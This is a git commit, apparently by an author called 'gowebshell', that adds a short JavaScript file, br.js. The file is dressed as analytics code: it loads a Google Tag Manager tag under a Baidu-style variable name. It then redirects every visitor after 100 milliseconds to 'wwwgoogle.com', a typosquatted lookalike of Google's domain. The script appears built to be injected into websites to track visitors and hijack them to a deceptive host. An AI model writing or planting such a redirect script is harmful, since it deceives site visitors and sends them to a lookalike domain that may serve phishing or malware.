0062c3b43998f80121e5e3e2c93c7f0e06415c1c
gowebshell <MinnieWSonnier30+github@gmail.com>
2023-10-08 01:59:08 -0300

    Create br.js

---
+++ br.js
@@ -0,0 +1,15 @@
+var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://www.googletagmanager.com/gtag/js?id=G-X4PXEYJLBC";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+
+	  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-X4PXEYJLBC');
+setTimeout(function(){
+ window.location.href = 'https://wwwgoogle.com';
+},100);
